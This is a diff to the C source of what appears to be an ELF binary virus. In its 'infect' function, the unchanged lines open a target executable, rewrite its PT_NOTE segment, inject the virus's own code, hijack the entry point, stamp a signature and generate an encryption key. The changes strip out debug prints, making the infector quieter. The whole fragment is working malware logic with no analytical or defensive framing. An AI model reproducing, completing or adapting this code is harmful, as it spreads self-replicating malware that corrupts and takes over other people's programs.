@@ -103,21 +103,16 @@ bool	infect(profiling *this, const str path) {
 
 	open(fd, path, O_RDWR);
 	if (fd < 0) {
-		printf(FILE_LINE("open failed: %ld\n"), ret);
 		return false;
 	}
 
 	fstat(ret, fd, &file_stat);
-	if (ret) {
-		printf(FILE_LINE("fstat failed: %ld\n"), ret);
-	}
 
 	if (file_stat.st_size < (long int)sizeof(Elf64_Ehdr))
 		goto infect_end;
 
 	mmap(file_origin, NULL, file_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 	if (file_origin == MAP_FAILED) {
-		printf(FILE_LINE("fstat failed: %p\n"), file_origin);
 		return true;
 	}
 
@@ -126,14 +121,11 @@ bool	infect(profiling *this, const str path) {
 
 	// Logic starts
 	if (parsing(file_origin, &data) == false) {
-		printf("%s is already infected or not compatible\n", path);
 		goto infect_end;
 	}
 
 	//	Change the PT_NOTE segment
 	change_note_segment(this, &data);
-
-	print_data(&data);
 
 	//	Copy the code
 	ft_memcpy(data.file + data.infection_offset_file, this->start_rip, this->size);
@@ -141,15 +133,9 @@ bool	infect(profiling *this, const str path) {
 	//	Change the entrypoint
 	data.elf->e_entry = data.infection_offset_mem + this->size - _START_SIZE;
 
-	write(ret, 1, &data.elf->e_entry, 4);
-
-	printf("%lx + %lx - %x = %lx (%lx)\n", data.infection_offset_mem, this->size, _START_SIZE, data.elf->e_entry,
-		data.infection_offset_mem + this->size - _START_SIZE);
 
 	//	Copy signature
 	ft_memcpy(data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET, (byte *)signature, 40);
-	printf("Written %s at 0x%lx\n", data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET,
-		data.infection_offset_file + this->size + SIGNATURE_OFFSET);
 
 	int	new_jump = 0 - (data.infection_offset_mem + this->size) + data.original_entry_point_mem + 12;
 	int zero = 0;
@@ -160,7 +146,6 @@ bool	infect(profiling *this, const str path) {
 
 	uint64_t key = generate_random_key();
 	if (key == 0) {
-		printf("Failed to generate a random key\n");
 		goto infect_end;
 	}
 
